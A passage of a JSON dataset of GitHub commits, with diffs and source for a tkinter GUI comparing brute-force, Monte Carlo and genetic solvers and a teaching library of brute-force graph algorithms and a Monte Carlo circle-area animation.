'require', 'awdark') self.mainwindow.tk.call('package', 'require', 'awlight') self.style=ttk.Style(self.mainwindow) self.style.theme_use('awdark') def brute_force_callback(self): self.BRUTEFORCE_FLAG=True self.GENETIC_FLAG=not self.BRUTEFORCE_FLAG self.MONTECARLO_FLAG=not self.BRUTEFORCE_FLAG def monte_carlo_callback(self): self.MONTECARLO_FLAG=True self.GENETIC_FLAG=not self.MONTECARLO_FLAG self.BRUTEFORCE_FLAG=not self.MONTECARLO_FLAG def genetic_algorithm_callback(self): self.GENETIC_FLAG=True self.MONTECARLO_FLAG=not self.GENETIC_FLAG self.BRUTEFORCE_FLAG=not self.GENETIC_FLAG def roulette_selection_callback(self): self.ROULETTE_FLAG=True self.ROULETTE_FLAG=not self.ROULETTE_FLAG def tournament_selection_callback(self): self.TOURNAMENT_FLAG=True self.ROULETTE_FLAG=not self.TOURNAMENT_FLAG def generate_problem_callback(self): ''' Initializes the problem we want to solve. It firstly selects a list of available symbols for variation to use based on n. After that it randomly chooses k elements from the list of available symbols. Finally, it concatenates them and when printing it in the entry box, adds a blank after each symbol for readabillity purposes. ''' self.PROBLEM_FLAG=True entry_field=self.builder.get_object('entry_problem') entry_field.delete(\"0\", \"end\") self.problem=''.join(choices(self.available_symbols[0:self.n], k=self.k)) entry_field.insert(0, ' '.join(self.problem)) def current_best_solution_validate_callback(self): pass def start_callback(self): self.START_FLAG=self.NUMBER_FLAG & self.PROBLEM_FLAG & self.SIZE_FLAG if self.START_FLAG: if self.BRUTEFORCE_FLAG: bf.generate_all(self.k, self.n, self.output_label, self.mainwindow, self.problem) elif self.MONTECARLO_FLAG: ... else: if self.TOURNAMENT_FLAG: ... else: ... def change_theme_callback(self): if self.style.theme_use()=='awdark': self.style.theme_use('awlight') else: self.style.theme_use('awdark') def show_resource_usage(self): self.builder.get_variable('cpu_usage').set(psutil.cpu_percent()) self.builder.get_variable('memory_usage').set(psutil.virtual_memory().percent) self.mainwindow.after(1000, self.show_resource_usage) def bind_validation(self): ''' Binds entry fields with their tkinter objects and enables user input validation for those objects. ''' entry_input_size=self.builder.get_object('entry_input_size') entry_variation_size=self.builder.get_object('entry_input_num_of_symbols') entry_mutation_rate=self.builder.get_object('entry_mutation_rate') entry_problem=self.builder.get_object('entry_problem') self.register_validation(tk.Entry(entry_input_size), self.input_size_validate_callback) self.register_validation(tk.Entry(entry_variation_size), self.input_number_validate_callback) self.register_validation(tk.Entry(entry_mutation_rate), self.mutation_rate_validate_callback) self.register_validation(tk.Entry(entry_problem), self.random_problem_validate_callback) def register_validation(self, entry, callback): ''' Registers validation function(binds each variable to its validate function). ''' reg=entry.register(callback) entry.config(validate=\"focusout\", validatecommand=(reg, '% P')) def input_size_validate_callback(self): self.clear_problem_entry() try: self.k=int(self.builder.get_variable('input_size').get()) except ValueError: self.SIZE_FLAG=False return False if self.k < 1 or self.k > 16: self.SIZE_FLAG=False return False else: self.SIZE_FLAG=True return True def input_number_validate_callback(self): self.clear_problem_entry() try: self.n=int(self.builder.get_variable('input_number').get()) except ValueError: self.NUMBER_FLAG=False return False if self.n < 1 or self.n > 36: self.NUMBER_FLAG=False return False else: self.NUMBER_FLAG=True return True def mutation_rate_validate_callback(self): try: self.mutation_rate=float(self.builder.get_variable('mutation_rate').get()) except ValueError: self.MUTATION_FLAG=True return True if(self.mutation_rate < 0 or self.mutation_rate > 100): self.MUTATION_FLAG=False return False else: self.MUTATION_FLAG=True return True def random_problem_validate_callback(self): ''' Gets problem string and then removes any space characters that are added when generating a problem or inputing it. Checks validity of our problem and sets PROBLEM_FLAG accordingly. ''' self.problem=(self.builder.get_variable('random_problem').get()).replace(' ', '') size=len(self.problem) if size==0: self.PROBLEM_FLAG=False return False self.k=size input_size=self.builder.get_object('entry_input_size') input_size.delete('0', 'end') input_size.insert(0, size) for i in self.problem: if i not in self.available_symbols: self.PROBLEM_FLAG=False return False self.PROBLEM_FLAG=True return True def clear_problem_entry(self): problem=self.builder.get_object('entry_problem') problem.delete('0', 'end') self.PROBLEM_FLAG=False def run(self): self.mainwindow.mainloop() ","sourceWithComments":"import os\nimport pygubu\nimport tkinter as tk\nimport tkinter.ttk as ttk\nimport psutil  # multi-platform library for system resource usage tracking\nfrom random import choices\nfrom string import ascii_lowercase # used to generate a list of available symbols\nimport bruteforce_iterative as bf\n\nPROJECT_PATH = os.path.dirname(__file__)\nPROJECT_UI = os.path.join(PROJECT_PATH, \"ui.ui\")\n\n\nclass UiApp:\n    def __init__(self):\n\n        self.builder = builder = pygubu.Builder()\n        builder.add_resource_path(PROJECT_PATH)\n        builder.add_from_file(PROJECT_UI)\n        self.mainwindow = builder.get_object('mainwindow')\n        builder.connect_callbacks(self)\n\n        self.theme()\n\n        # variable initialization\n        self.k = 5\n        self.n = 5\n        self.problem = ''\n        self.available_symbols = list(ascii_lowercase) + [str(i) for i in range(10)]\n        self.output_label = self.builder.get_object('label_current_best_solution')\n        self.current_solution = ''\n        self.builder.get_variable('algo_group').set('1')\n        self.builder.get_variable('gene_group').set('-1')\n\n        self.initialize_flags()\n\n        self.show_resource_usage()\n\n        self.bind_validation()\n\n\n\n    def initialize_flags(self):\n        '''\n        Initializes flags used to communicate frontend and backend states.\n        Initially, size, number, genetic and tournamet flags are True because\n        they have a valid default state.\n        '''\n\n        self.MUTATION_FLAG = True\n        self.PROBLEM_FLAG = False\n        self.SIZE_FLAG = True\n        self.START_FLAG = False\n        self.NUMBER_FLAG = True\n        self.BRUTEFORCE_FLAG = True\n        self.MONTECARLO_FLAG = False\n        self.GENETIC_FLAG = False\n        self.ROULETTE_FLAG = False\n        self.TOURNAMENT_FLAG = False\n\n\n    def theme(self):\n        # root.tk.call locates the theme package and selects styles we wish \n        # to use from that package\n        self.theme_abs_path = os.path.abspath('awthemes-10.2.1')\n        self.mainwindow.tk.call('lappend', 'auto_path', self.theme_abs_path)\n        self.mainwindow.tk.call('package', 'require', 'awdark')\n        self.mainwindow.tk.call('package', 'require', 'awlight')\n        # to change the style we need to create an instance of 'Style' class\n        self.style = ttk.Style(self.mainwindow)\n        self.style.theme_use('awdark')\n        # self.style.theme_use('awlight')\n\n\n    def brute_force_callback(self):\n        self.BRUTEFORCE_FLAG = True\n        self.GENETIC_FLAG = not self.BRUTEFORCE_FLAG\n        self.MONTECARLO_FLAG = not self.BRUTEFORCE_FLAG\n\n    def monte_carlo_callback(self):\n        self.MONTECARLO_FLAG = True\n        self.GENETIC_FLAG = not self.MONTECARLO_FLAG\n        self.BRUTEFORCE_FLAG = not self.MONTECARLO_FLAG\n\n    def genetic_algorithm_callback(self):\n        self.GENETIC_FLAG = True\n        self.MONTECARLO_FLAG = not self.GENETIC_FLAG\n        self.BRUTEFORCE_FLAG = not self.GENETIC_FLAG\n\n    def roulette_selection_callback(self):\n        self.ROULETTE_FLAG = True\n        self.ROULETTE_FLAG = not self.ROULETTE_FLAG\n    \n    def tournament_selection_callback(self):\n        self.TOURNAMENT_FLAG = True\n        self.ROULETTE_FLAG = not self.TOURNAMENT_FLAG\n\n    def generate_problem_callback(self):\n        '''\n        Initializes the problem we want to solve.\n\n        It firstly selects a list of available symbols for variation\n        to use based on n. After that it randomly chooses k elements from\n        the list of available symbols. Finally, it concatenates them and\n        when printing it in the entry box, adds a blank after each symbol\n        for readabillity purposes.\n        '''\n        \n        self.PROBLEM_FLAG = True\n\n        entry_field = self.builder.get_object('entry_problem')\n        entry_field.delete(\"0\", \"end\")\n        \n        self.problem = ''.join(choices(self.available_symbols[0:self.n], k = self.k))\n        \n        entry_field.insert(0, ' '.join(self.problem))\n\n\n    def current_best_solution_validate_callback(self):\n        pass\n\n    def start_callback(self):\n        self.START_FLAG = self.NUMBER_FLAG & self.PROBLEM_FLAG & self.SIZE_FLAG\n        \n        if self.START_FLAG:\n            if self.BRUTEFORCE_FLAG:\n                bf.generate_all(self.k, self.n, self.output_label, self.mainwindow, self.problem)\n            elif self.MONTECARLO_FLAG:\n                ...\n            else:\n                if self.TOURNAMENT_FLAG:\n                    ...\n                else:\n                    ...\n\n\n    def change_theme_callback(self):\n        if self.style.theme_use() == 'awdark':\n            self.style.theme_use('awlight')\n        else:\n            self.style.theme_use('awdark')\n\n\n    def show_resource_usage(self):\n        self.builder.get_variable('cpu_usage').set(psutil.cpu_percent())\n        self.builder.get_variable('memory_usage').set(psutil.virtual_memory().percent)\n        # updates usage stats every 1000ms\n        self.mainwindow.after(1000, self.show_resource_usage)\n\n    def bind_validation(self):\n        '''\n        Binds entry fields with their tkinter objects and\n        enables user input validation for those objects.\n        '''\n\n        entry_input_size = self.builder.get_object('entry_input_size')\n        entry_variation_size = self.builder.get_object('entry_input_num_of_symbols')\n        entry_mutation_rate = self.builder.get_object('entry_mutation_rate')\n        entry_problem = self.builder.get_object('entry_problem')\n\n\n        \n        self.register_validation(tk.Entry(entry_input_size), self.input_size_validate_callback)\n        self.register_validation(tk.Entry(entry_variation_size), self.input_number_validate_callback)\n        self.register_validation(tk.Entry(entry_mutation_rate), self.mutation_rate_validate_callback)\n        self.register_validation(tk.Entry(entry_problem), self.random_problem_validate_callback)\n\n    def register_validation(self, entry, callback):\n        '''\n        Registers validation function (binds each variable to its\n        validate function).\n        '''\n        # reg is the name of our callback function\n        reg = entry.register(callback)\n        entry.config(validate = \"focusout\", validatecommand = (reg, '% P'))\n\n    def input_size_validate_callback(self):\n\n        self.clear_problem_entry()\n        \n        try:\n            self.k = int(self.builder.get_variable('input_size').get())\n        except ValueError:\n            self.SIZE_FLAG = False\n            return False\n\n        if self.k < 1 or self.k > 16:\n            self.SIZE_FLAG = False\n            return False\n        else:\n            self.SIZE_FLAG = True\n            return True\n\n    def input_number_validate_callback(self):\n\n        self.clear_problem_entry()\n\n        try:\n            self.n = int(self.builder.get_variable('input_number').get())\n        except ValueError:\n            self.NUMBER_FLAG = False\n            return False\n        \n        if self.n < 1 or self.n > 36:\n            self.NUMBER_FLAG = False\n            return False\n        else:\n            self.NUMBER_FLAG = True\n            return True\n    \n    def mutation_rate_validate_callback(self):\n\n        # catches if entry field is empty (default 0% mutation rate then)\n        try:\n            self.mutation_rate = float(self.builder.get_variable('mutation_rate').get())\n        except ValueError:\n            self.MUTATION_FLAG = True\n            return True\n\n        if(self.mutation_rate < 0 or self.mutation_rate > 100):\n            self.MUTATION_FLAG = False\n            return False\n        else:\n            self.MUTATION_FLAG = True\n            return True\n    \n    def random_problem_validate_callback(self):\n        '''\n        Gets problem string and then removes any space characters that are\n        added when generating a problem or inputing it.\n        Checks validity of our problem and sets PROBLEM_FLAG accordingly.\n        '''\n\n        self.problem = (self.builder.get_variable('random_problem').get()).replace(' ', '')\n        \n        size = len(self.problem)\n        \n        if size == 0:\n            self.PROBLEM_FLAG = False\n            return False\n        \n        self.k = size\n        input_size = self.builder.get_object('entry_input_size')\n        input_size.delete('0', 'end')\n        input_size.insert(0, size)\n\n        for i in self.problem:\n            if i not in self.available_symbols:\n                self.PROBLEM_FLAG = False\n                return False\n\n        self.PROBLEM_FLAG = True\n        return True\n\n    def clear_problem_entry(self):\n        problem = self.builder.get_object('entry_problem')\n        problem.delete('0', 'end')\n        self.PROBLEM_FLAG = False\n\n    def run(self):\n        self.mainwindow.mainloop()\n"}},"msg":"IMPROVED: brute force algorithm; result printing; TODO: progress bar implementation for brute force algorithm"}},"https:\/\/github.com\/teaching-tool\/practical-exercises":{"52577fa850f5649e2654e16d6d554a500ac1c987":{"url":"https:\/\/api.github.com\/repos\/teaching-tool\/practical-exercises\/commits\/52577fa850f5649e2654e16d6d554a500ac1c987","html_url":"https:\/\/github.com\/teaching-tool\/practical-exercises\/commit\/52577fa850f5649e2654e16d6d554a500ac1c987","message":"Improved dnf brute force & circles animation","sha":"52577fa850f5649e2654e16d6d554a500ac1c987","keyword":"brute force improve","diff":"diff --git a\/pythonLib\/advalg\/brute_force.py b\/pythonLib\/advalg\/brute_force.py\nindex b14015a..3ff1153 100644\n--- a\/pythonLib\/advalg\/brute_force.py\n+++ b\/pythonLib\/advalg\/brute_force.py\n@@ -1,4 +1,4 @@\n-from advalg.helpers import combinations, permutations, subsets\n+from advalg.helpers import combinations, n_tuples, permutations, subsets\n import advalg.graph_helpers as gh\n import math\n \n@@ -30,3 +30,14 @@ def brute_vc(g):\n def brute_isets(g):\n     \"\"\"Uses brute force to construct all independent sets of g\"\"\"\n     return [s for s in subsets(g.vertices()) if gh.is_iset(g,s)]\n+\n+def brute_dnf_count(dnf):\n+    \"\"\"Uses brute force to count number of satisfying assignments in the given dnf\"\"\"\n+    count = 0\n+\n+    for tup in n_tuples([True, False], dnf.var_count()):\n+        asn = {(i+1):tup[i] for i in range(len(tup))}\n+        if dnf.is_satisfied(asn):\n+            count += 1\n+    \n+    return count\n\\ No newline at end of file\ndiff --git a\/pythonLib\/advalg\/circle_animation.py b\/pythonLib\/advalg\/circle_animation.py\nindex 27e9a9d..265e5cb 100644\n--- a\/pythonLib\/advalg\/circle_animation.py\n+++ b\/pythonLib\/advalg\/circle_animation.py\n@@ -15,9 +15,8 @@ def __init__(self, circles, sampler, samples = 1000, delay = 50):\n \n         self.fig = plt.figure()\n         self.fig.canvas.manager.set_window_title(\"Circle Animation\")\n-        self.gs = self.fig.add_gridspec(3)\n         self.fig.set_dpi(100)\n-        self.fig.set_size_inches(7, 7)\n+        self.fig.set_size_inches(8, 6)\n \n         self.ax, self.title = self.setup_ax()\n         self.plot_ax = self.setup_plot_ax()\n@@ -38,13 +37,13 @@ def __init__(self, circles, sampler, samples = 1000, delay = 50):\n         plt.show()\n \n     def setup_ax(self):\n-        ax = self.fig.add_subplot(self.gs[:2], xlim=(0, 100), ylim=(0,100))\n+        ax = plt.axes([0.125, 0.375, 0.75, 0.6], xlim=(0,100), ylim=(0,100))\n         ax.set_aspect('equal', adjustable='box')\n         title = ax.text(0.5, 0.88, \"\", bbox={'facecolor':'w', 'alpha':0.5, 'pad':5},transform=ax.transAxes, ha=\"center\")\n         return ax, title\n \n     def setup_plot_ax(self):\n-        plot_ax = self.fig.add_subplot(self.gs[2], xlim=(0, self.total_samples))\n+        plot_ax = plt.axes([0.125, 0.075, 0.75, 0.25])\n         plot_ax.set_xlabel(\"Samples\")\n         plot_ax.set_ylabel(\"Area\")\n         return plot_ax\ndiff --git a\/pythonLib\/advalg\/circle_editor.py b\/pythonLib\/advalg\/circle_editor.py\nindex 50f4069..d1e461b 100644\n--- a\/pythonLib\/advalg\/circle_editor.py\n+++ b\/pythonLib\/advalg\/circle_editor.py\n@@ -15,13 +15,17 @@ def __init__(self, start_action):\n         self.colors.reverse()\n         self.max_circles = len(self.colors)\n \n-        # Set up circles area\n-        fig,ax = plt.subplots()\n+        # Set up figure\n+        fig = plt.figure()\n+        fig.set_size_inches(8,6)\n         fig.canvas.manager.set_window_title(\"Circle Editor\")\n+        self.fig = fig\n+\n+        # Set up drawings axes\n+        ax = plt.axes([0.125, 0.125, 0.75, 0.75])\n         ax.set_aspect('equal', adjustable='box')\n         ax.set_xlim(0, 100)\n         ax.set_ylim(0, 100)\n-        self.fig = fig\n         self.ax = ax\n \n         # Add size slider\n@@ -37,7 +41,7 @@ def __init__(self, start_action):\n         freq_slider.on_changed(self.set_radius)\n \n         # Add start button\n-        btn_ax = plt.axes([0.45, 0.05, 0.1, 0.05])\n+        btn_ax = plt.axes([0.45, 0.01, 0.1, 0.05])\n         btn = Button(btn_ax, \"Start\")\n         btn.on_clicked(self.on_start_clicked)\n \ndiff --git a\/pythonLib\/advalg\/helpers.py b\/pythonLib\/advalg\/helpers.py\nindex 4e9fd11..c3893e0 100644\n--- a\/pythonLib\/advalg\/helpers.py\n+++ b\/pythonLib\/advalg\/helpers.py\n@@ -27,6 +27,11 @@ def permutations(items: Iterable, count: int) -> Iterator[Tuple]:\n     assert(0 <= count <= len(l))\n     return itertools.permutations(l, count)\n \n+def n_tuples(items: Iterable, count: int) -> Iterator[Tuple]:\n+    l = list(items)\n+    assert(0 <= count)\n+    return itertools.product(items, repeat=count)\n+\n def subsets(items: Iterable) -> Iterator[Tuple]:\n     \"\"\"Returns all subsets of items as an iterator of tuples\"\"\"\n     l = list(items)\n@@ -34,7 +39,8 @@ def subsets(items: Iterable) -> Iterator[Tuple]:\n \n def choose(n: int, k: int) -> int:\n     \"\"\"Returns the binomial coefficient n choose k\"\"\"\n-    if (k == 0): return 1\n+    if k == 0: return 1\n     return (n * choose(n-1, k-1)) \/\/ k\n \n+\n # TODO statistical physics formula\n\\ No newline at end of file\ndiff --git a\/pythonLib\/advalg\/tests3.py b\/pythonLib\/advalg\/tests3.py\nindex 9c45838..7fc960f 100644\n--- a\/pythonLib\/advalg\/tests3.py\n+++ b\/pythonLib\/advalg\/tests3.py\n@@ -1,9 +1,5 @@\n from advalg.dnf import DNF\n \n-# 1 assignment not good test\n-dnf1 = DNF(3)\n-dnf1.add_clause([1,2,3])\n-\n # 8 assignments\n dnf2 = DNF(4)\n dnf2.add_clause([1,2])\n@@ -27,11 +23,9 @@\n dnf5.add_clause([1,2,3,4,5,6,7,8,9,10,11,12,13,14,15])\n \n tests = [\n-    (dnf1, 1),\n     (dnf2, 8),\n     (dnf3, 28),\n     (dnf4, 704),\n-    (dnf5, 129)\n ]\n \n samples = [10, 100, 1000]\n","files":{"\/pythonLib\/advalg\/brute_force.py":{"changes":[{"diff":"\n-from advalg.helpers import combinations, permutations, subsets\n+from advalg.helpers import combinations, n_tuples, permutations, subsets\n import advalg.graph_helpers as gh\n import math\n \n","add":1,"remove":1,"filename":"\/pythonLib\/advalg\/brute_force.py","badparts":["from advalg.helpers import combinations, permutations, subsets"],"goodparts":["from advalg.helpers import combinations, n_tuples, permutations, subsets"]}],"source":"\nfrom advalg.helpers import combinations, permutations, subsets import advalg.graph_helpers as gh import math def brute_perf_matchings(g): \"\"\"Computes the number of perfect matchings in g using brute force.\"\"\" n=g.vertex_count() if n % 2 !=0: return 0 return len([c for c in combinations(g.edges(), n\/\/2) if gh.is_perf_matching(g,c)]) def brute_cheapest_hamcycle(g): \"\"\" Computes the weight of the cheapest hamiltonian cycle in g. Returns inf if no hamiltonian cycle exists. \"\"\" tours=[p +(p[0],) for p in permutations(g.vertices(), g.vertex_count())] ham_cycles=[t for t in tours if gh.is_hamcycle(g,t)] if len(ham_cycles)==0: return math.inf return min([gh.tour_cost(g, t) for t in ham_cycles]) def brute_hamcycles(g): \"\"\"Constructs all hamiltonian cycles of g using brute force\"\"\" tours=(p +(p[0],) for p in permutations(g.vertices(), g.vertex_count())) return(t for t in tours if gh.is_hamcycle(g,t)) def brute_vc(g): \"\"\"Computes the size of the minimum vertex cover of g using brute force\"\"\" return min([len(sub) for sub in subsets(g.vertices()) if gh.is_vc(g,sub)]) def brute_isets(g): \"\"\"Uses brute force to construct all independent sets of g\"\"\" return[s for s in subsets(g.vertices()) if gh.is_iset(g,s)] ","sourceWithComments":"from advalg.helpers import combinations, permutations, subsets\nimport advalg.graph_helpers as gh\nimport math\n\ndef brute_perf_matchings(g):\n    \"\"\"Computes the number of perfect matchings in g using brute force.\"\"\"\n    n = g.vertex_count()\n    if n % 2 != 0: return 0\n    return len([c for c in combinations(g.edges(), n\/\/2) if gh.is_perf_matching(g,c)])\n\ndef brute_cheapest_hamcycle(g):\n    \"\"\"\n    Computes the weight of the cheapest hamiltonian cycle in g.\n    Returns inf if no hamiltonian cycle exists.\n    \"\"\"\n    tours = [p + (p[0],) for p in permutations(g.vertices(), g.vertex_count())]\n    ham_cycles = [t for t in tours if gh.is_hamcycle(g,t)]\n    if len(ham_cycles) == 0: return math.inf\n    return min([gh.tour_cost(g, t) for t in ham_cycles])\n\ndef brute_hamcycles(g):\n    \"\"\"Constructs all hamiltonian cycles of g using brute force\"\"\"\n    tours = (p + (p[0],) for p in permutations(g.vertices(), g.vertex_count()))\n    return (t for t in tours if gh.is_hamcycle(g,t))\n\ndef brute_vc(g):\n    \"\"\"Computes the size of the minimum vertex cover of g using brute force\"\"\"\n    return min([len(sub) for sub in subsets(g.vertices()) if gh.is_vc(g,sub)])\n\ndef brute_isets(g):\n    \"\"\"Uses brute force to construct all independent sets of g\"\"\"\n    return [s for s in subsets(g.vertices()) if gh.is_iset(g,s)]\n"},"\/pythonLib\/advalg\/circle_animation.py":{"changes":[{"diff":"\n \n         self.fig = plt.figure()\n         self.fig.canvas.manager.set_window_title(\"Circle Animation\")\n-        self.gs = self.fig.add_gridspec(3)\n         self.fig.set_dpi(100)\n-        self.fig.set_size_inches(7, 7)\n+        self.fig.set_size_inches(8, 6)\n \n         self.ax, self.title = self.setup_ax()\n         self.plot_ax = self.setup_plot_ax()\n","add":1,"remove":2,"filename":"\/pythonLib\/advalg\/circle_animation.py","badparts":["        self.gs = self.fig.add_gridspec(3)","        self.fig.set_size_inches(7, 7)"],"goodparts":["        self.fig.set_size_inches(8, 6)"]},{"diff":"\n         plt.show()\n \n     def setup_ax(self):\n-        ax = self.fig.add_subplot(self.gs[:2], xlim=(0, 100), ylim=(0,100))\n+        ax = plt.axes([0.125, 0.375, 0.75, 0.6], xlim=(0,100), ylim=(0,100))\n         ax.set_aspect('equal', adjustable='box')\n         title = ax.text(0.5, 0.88, \"\", bbox={'facecolor':'w', 'alpha':0.5, 'pad':5},transform=ax.transAxes, ha=\"center\")\n         return ax, title\n \n     def setup_plot_ax(self):\n-        plot_ax = self.fig.add_subplot(self.gs[2], xlim=(0, self.total_samples))\n+        plot_ax = plt.axes([0.125, 0.075, 0.75, 0.25])\n         plot_ax.set_xlabel(\"Samples\")\n         plot_ax.set_ylabel(\"Area\")\n         return plot_a","add":2,"remove":2,"filename":"\/pythonLib\/advalg\/circle_animation.py","badparts":["        ax = self.fig.add_subplot(self.gs[:2], xlim=(0, 100), ylim=(0,100))","        plot_ax = self.fig.add_subplot(self.gs[2], xlim=(0, self.total_samples))"],"goodparts":["        ax = plt.axes([0.125, 0.375, 0.75, 0.6], xlim=(0,100), ylim=(0,100))","        plot_ax = plt.axes([0.125, 0.075, 0.75, 0.25])"]}],"source":"\nfrom matplotlib import pyplot as plt from matplotlib import animation import numpy as np class CircleAnimation: def __init__(self, circles, sampler, samples=1000, delay=50): self.total_samples=samples self.circles=circles self.sampler=sampler(circles) self.sample_success=0 self.sample_count=0 self.estimates=[] self.total_area=sum([c.area() for c in circles]) self.fig=plt.figure() self.fig.canvas.manager.set_window_title(\"Circle Animation\") self.gs=self.fig.add_gridspec(3) self.fig.set_dpi(100) self.fig.set_size_inches(7, 7) self.ax, self.title=self.setup_ax() self.plot_ax=self.setup_plot_ax() self.sample=plt.Circle((5, -5), 1, ec='black') self.draw_circles() self.area=self.actual_area() self.plot_ax.plot(np.arange(1, self.total_samples+1), np.ones(self.total_samples) * self.area, lw=3, label=\"Actual\") self.line=self.plot_ax.plot([],[], lw=3, label=\"Estimate\")[0] self.plot_ax.legend() self.anim=animation.FuncAnimation(self.fig, self.animate, init_func=self.init, frames=self.total_samples, interval=delay, repeat=False) plt.show() def setup_ax(self): ax=self.fig.add_subplot(self.gs[:2], xlim=(0, 100), ylim=(0,100)) ax.set_aspect('equal', adjustable='box') title=ax.text(0.5, 0.88, \"\", bbox={'facecolor':'w', 'alpha':0.5, 'pad':5},transform=ax.transAxes, ha=\"center\") return ax, title def setup_plot_ax(self): plot_ax=self.fig.add_subplot(self.gs[2], xlim=(0, self.total_samples)) plot_ax.set_xlabel(\"Samples\") plot_ax.set_ylabel(\"Area\") return plot_ax def actual_area(self): area=0 for x in np.linspace(0,100,1000): for y in np.linspace(0,100,1000): if self.in_circle(x,y): area +=0.01 return area def in_circle(self, x, y): return any((c.inside(x,y) for c in self.circles)) def area_estimate(self): ratio=self.sample_success \/ self.sample_count return ratio * self.total_area def update_title(self): estimate=f\"Area Estimate:{self.area_estimate():.2f}\" success=f\"Success:{self.sample_success}\/{self.sample_count}\" self.title.set_text(f\"{estimate}\\n{success}\") def update_sample(self, c_i, p): (x,y)=p c=self.circles[c_i] self.sample.center=(x, y) self.sample.set_facecolor(c.color) def update_plot(self): x=np.arange(1, self.sample_count+1) y=self.estimates self.line.set_data(x,y) y_low=min(min(y), self.area) * 0.95 y_hi=max(max(y), self.area) * 1.05 self.plot_ax.set_ylim(y_low, y_hi) def draw_circles(self): self.ax.patches=[] for c in reversed(self.circles): circle=plt.Circle((c.x, c.y), c.radius, fc=c.color, alpha=0.85, ec=\"black\") self.ax.add_patch(circle) self.fig.canvas.draw() def init(self): self.sample.center=(5, 5) self.ax.add_patch(self.sample) def animate(self,i): self.sample_count=i+1 c_i, p=self.sampler.sample() if self.sampler.good_sample(c_i, p): self.sample_success +=1 self.estimates.append(self.area_estimate()) self.update_sample(c_i, p) self.update_title() self.update_plot() ","sourceWithComments":"from matplotlib import pyplot as plt\nfrom matplotlib import animation\n\nimport numpy as np\n\nclass CircleAnimation:\n    def __init__(self, circles, sampler, samples = 1000, delay = 50):\n        self.total_samples = samples\n        self.circles = circles\n        self.sampler = sampler(circles)\n        self.sample_success = 0\n        self.sample_count = 0\n        self.estimates = []\n        self.total_area = sum([c.area() for c in circles])\n\n        self.fig = plt.figure()\n        self.fig.canvas.manager.set_window_title(\"Circle Animation\")\n        self.gs = self.fig.add_gridspec(3)\n        self.fig.set_dpi(100)\n        self.fig.set_size_inches(7, 7)\n\n        self.ax, self.title = self.setup_ax()\n        self.plot_ax = self.setup_plot_ax()\n        self.sample = plt.Circle((5, -5), 1, ec='black')\n\n        self.draw_circles()\n\n        self.area = self.actual_area()\n        self.plot_ax.plot(np.arange(1, self.total_samples+1), np.ones(self.total_samples) * self.area, lw=3, label=\"Actual\")\n        self.line = self.plot_ax.plot([], [], lw=3, label=\"Estimate\")[0]\n        self.plot_ax.legend()\n\n        self.anim = animation.FuncAnimation(self.fig, self.animate, \n                               init_func=self.init, \n                               frames=self.total_samples, \n                               interval=delay,\n                               repeat=False)\n        plt.show()\n\n    def setup_ax(self):\n        ax = self.fig.add_subplot(self.gs[:2], xlim=(0, 100), ylim=(0,100))\n        ax.set_aspect('equal', adjustable='box')\n        title = ax.text(0.5, 0.88, \"\", bbox={'facecolor':'w', 'alpha':0.5, 'pad':5},transform=ax.transAxes, ha=\"center\")\n        return ax, title\n\n    def setup_plot_ax(self):\n        plot_ax = self.fig.add_subplot(self.gs[2], xlim=(0, self.total_samples))\n        plot_ax.set_xlabel(\"Samples\")\n        plot_ax.set_ylabel(\"Area\")\n        return plot_ax\n\n    def actual_area(self):\n        area = 0\n        for x in np.linspace(0,100,1000):\n            for y in np.linspace(0,100,1000):\n                if self.in_circle(x,y):\n                    area += 0.01\n        return area\n\n    def in_circle(self, x, y):\n        return any((c.inside(x,y) for c in self.circles))\n\n    def area_estimate(self):\n        ratio = self.sample_success \/ self.sample_count\n        return ratio * self.total_area\n\n    def update_title(self):\n        estimate = f\"Area Estimate: {self.area_estimate():.2f}\"\n        success = f\"Success: {self.sample_success}\/{self.sample_count}\"\n        self.title.set_text(f\"{estimate}\\n{success}\")\n\n    def update_sample(self, c_i, p):\n        (x,y) = p\n        c = self.circles[c_i]\n        self.sample.center = (x, y)\n        self.sample.set_facecolor(c.color)\n\n    def update_plot(self):\n        x = np.arange(1, self.sample_count+1)\n        y = self.estimates\n        self.line.set_data(x,y)\n        y_low = min(min(y), self.area) * 0.95\n        y_hi = max(max(y), self.area) * 1.05\n        self.plot_ax.set_ylim(y_low, y_hi)\n\n    def draw_circles(self):\n        self.ax.patches = []\n        for c in reversed(self.circles):\n            circle = plt.Circle((c.x, c.y), c.radius, fc=c.color, alpha=0.85, ec=\"black\")\n            self.ax.add_patch(circle)\n        self.fig.canvas.draw()\n\n    def init(self):\n        self.sample.center = (5, 5)\n        self.ax.add_patch(self.sample)\n\n    def animate(self,i):\n        self.sample_count = i+1\n        c_i, p = self.sampler.sample()\n\n        if self.sampler.good_sample(c_i, p):\n            self.sample_success += 1\n\n        self.estimates.append(self.area_estimate())\n        \n        self.update_sample(c_i, p)\n        self.update_title()\n        self.update_plot()"},"\/pythonLib\/advalg\/circle_editor.py":{"changes":[{"diff":"\n         self.colors.reverse()\n         self.max_circles = len(self.colors)\n \n-        # Set up circles area\n-        fig,ax = plt.subplots()\n+        # Set up figure\n+        fig = plt.figure()\n+        fig.set_size_inches(8,6)\n         fig.canvas.manager.set_window_title(\"Circle Editor\")\n+        self.fig = fig\n+\n+        # Set up drawings axes\n+        ax = plt.axes([0.125, 0.125, 0.75, 0.75])\n         ax.set_aspect('equal', adjustable='box')\n         ax.set_xlim(0, 100)\n         ax.set_ylim(0, 100)\n-        self.fig = fig\n         self.ax = ax\n \n         # Add size slider\n","add":7,"remove":3,"filename":"\/pythonLib\/advalg\/circle_editor.py","badparts":["        fig,ax = plt.subplots()","        self.fig = fig"],"goodparts":["        fig = plt.figure()","        fig.set_size_inches(8,6)","        self.fig = fig","        ax = plt.axes([0.125, 0.125, 0.75, 0.75])"]},{"diff":"\n         freq_slider.on_changed(self.set_radius)\n \n         # Add start button\n-        btn_ax = plt.axes([0.45, 0.05, 0.1, 0.05])\n+        btn_ax = plt.axes([0.45, 0.01, 0.1, 0.05])\n         btn = Button(btn_ax, \"Start\")\n         btn.on_clicked(self.on_start_clicked)","add":1,"remove":1,"filename":"\/pythonLib\/advalg\/circle_editor.py","badparts":["        btn_ax = plt.axes([0.45, 0.05, 0.1, 0.05])"],"goodparts":["        btn_ax = plt.axes([0.45, 0.01, 0.1, 0.05])"]}],"source":"\nfrom advalg.circle import Circle import math import matplotlib.pyplot as plt import matplotlib.colors as mcolors from matplotlib.backend_bases import MouseButton from matplotlib.widgets import Button, Slider class CircleEditor: def __init__(self, start_action): self.start_action=start_action self.circles=[] self.radius=5 self.dragging=None self.colors=[c for c in mcolors.TABLEAU_COLORS] self.colors.reverse() 